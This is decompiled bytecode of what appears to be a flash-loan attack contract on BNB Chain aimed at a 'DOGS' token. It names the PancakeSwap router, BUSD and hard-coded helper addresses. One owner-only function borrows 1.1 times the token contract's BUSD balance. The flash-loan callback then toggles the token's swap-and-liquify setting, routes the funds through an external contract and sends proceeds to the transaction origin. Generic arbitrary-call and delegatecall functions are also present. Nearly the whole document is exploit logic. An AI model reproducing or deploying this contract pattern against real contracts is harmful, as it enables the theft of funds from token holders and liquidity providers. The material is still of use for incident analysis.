contract main {




// =====================  Runtime code  =====================


const sub_486b2944(?) = 0xae672d88eff0bc3f561044e7f41ee7099610fa97

const sub_68c19671(?) = 0x3a4c15f96b3b058ab3fb5faf1440cc19e7ae07ce

const sub_8fb97547(?) = 0x2bc4eb013ddee29d37920938b96d353171289b7c

const getAllowance = ext_call.return_data[0]

const ROUTER = 0x10ed43c718714eb63d5aa57b78b54704e256024e

const BUSD = 0xe9e7cea3dedca5984780bafc599bd69add087d56

const DOGS = 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e


address owner;
address originAddress;

function owner() {
    return owner
}

function origin() {
    return originAddress
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = 0
    emit OwnershipTransferred(owner, 0);
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    owner = arg1
    emit OwnershipTransferred(owner, arg1);
}

function sub_0fbaa073(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e)
    call 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e.transferOperator(address arg1) with:
         gas gas_remaining wei
        args msg.sender
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function inCaseTokensGetStuck(address arg1, uint256 arg2, address arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args address(arg3), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function sub_ad1d5f2b(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    originAddress = tx.origin
    require ext_code.size(0xe9e7cea3dedca5984780bafc599bd69add087d56)
    staticcall 0xe9e7cea3dedca5984780bafc599bd69add087d56.0x70a08231 with:
            gas gas_remaining wei
           args 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    if ext_call.return_data[0] and 11 > -1 / ext_call.return_data[0]:
        revert with 'NH{q', 17
    require ext_code.size(0x2bc4eb013ddee29d37920938b96d353171289b7c)
    call 0x2bc4eb013ddee29d37920938b96d353171289b7c.flashLoan(address arg1, address arg2, uint256 arg3, bytes arg4) with:
         gas gas_remaining wei
        args address(this.address), address(this.address), Mask(255, 1, 11 * ext_call.return_data[0] / 10), 128, 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function sub_28af99fb(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 <= test266151307()
    require arg2 + 35 < calldata.size
    if arg2.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg2.length)) + 97 > test266151307() or ceil32(ceil32(arg2.length)) + 97 < 96:
        revert with 'NH{q', 65
    mem[96] = arg2.length
    require arg2 + arg2.length + 36 <= calldata.size
    mem[128 len arg2.length] = arg2[all]
    mem[arg2.length + 128] = 0
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    mem[ceil32(ceil32(arg2.length)) + 97 len ceil32(arg2.length)] = arg2[all], mem[arg2.length + 128 len ceil32(arg2.length) - arg2.length]
    if ceil32(arg2.length) > arg2.length:
        mem[ceil32(ceil32(arg2.length)) + arg2.length + 97] = 0
    delegate address(arg1).mem[ceil32(ceil32(arg2.length)) + 97 len 4] with:
         gas gas_remaining wei
        args mem[ceil32(ceil32(arg2.length)) + 101 len arg2.length - 4]
    if not delegate.return_code:
        revert with 0, 'Reverted.'
    if not return_data.size:
        return Array(len=arg2.length, data=arg2[all])
    return Array(len=return_data.size, data=ext_call.return_data[0 len return_data.size])
}

function executeTransaction(address arg1, uint256 arg2, bytes arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 <= test266151307()
    require arg3 + 35 < calldata.size
    if arg3.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg3.length)) + 97 > test266151307() or ceil32(ceil32(arg3.length)) + 97 < 96:
        revert with 'NH{q', 65
    mem[96] = arg3.length
    require arg3 + arg3.length + 36 <= calldata.size
    mem[128 len arg3.length] = arg3[all]
    mem[arg3.length + 128] = 0
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    mem[ceil32(ceil32(arg3.length)) + 97 len ceil32(arg3.length)] = arg3[all], mem[arg3.length + 128 len ceil32(arg3.length) - arg3.length]
    if ceil32(arg3.length) > arg3.length:
        mem[ceil32(ceil32(arg3.length)) + arg3.length + 97] = 0
    call arg1.mem[ceil32(ceil32(arg3.length)) + 97 len 4] with:
       value arg2 wei
         gas gas_remaining wei
        args mem[ceil32(ceil32(arg3.length)) + 101 len arg3.length - 4]
    if not ext_call.success:
        revert with 0, 'Reverted.'
    if not return_data.size:
        return Array(len=arg3.length, data=arg3[all])
    return Array(len=return_data.size, data=ext_call.return_data[0 len return_data.size])
}

function onFlashLoan(address arg1, address arg2, uint256 arg3, uint256 arg4, bytes arg5) {
    require calldata.size - 4 >= 160
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 == arg4
    require arg5 <= test266151307()
    require arg5 + 35 < calldata.size
    require arg5.length <= test266151307()
    require arg5 + arg5.length + 36 <= calldata.size
    if originAddress != tx.origin:
        revert with 0, 'dumb origin check failed'
    require ext_code.size(0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e)
    call 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e.updateSwapAndLiquifyEnabled(bool arg1) with:
         gas gas_remaining wei
        args 1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(0xae672d88eff0bc3f561044e7f41ee7099610fa97)
    call 0xae672d88eff0bc3f561044e7f41ee7099610fa97.0xea29cafb with:
         gas gas_remaining wei
        args 0xe9e7cea3dedca5984780bafc599bd69add087d56, arg3, 1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e)
    call 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e.0xa9059cbb with:
         gas gas_remaining wei
        args tx.origin, 1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    require ext_code.size(0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e)
    call 0xdbdc73b95cc0d5e7e99dc95523045fc8d075fb9e.updateSwapAndLiquifyEnabled(bool arg1) with:
         gas gas_remaining wei
        args 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    return 0x7968ba28153757de2da7bce4c2ba9ebaf94445061f3050de1b0de5c34bb7d5d8
}



}
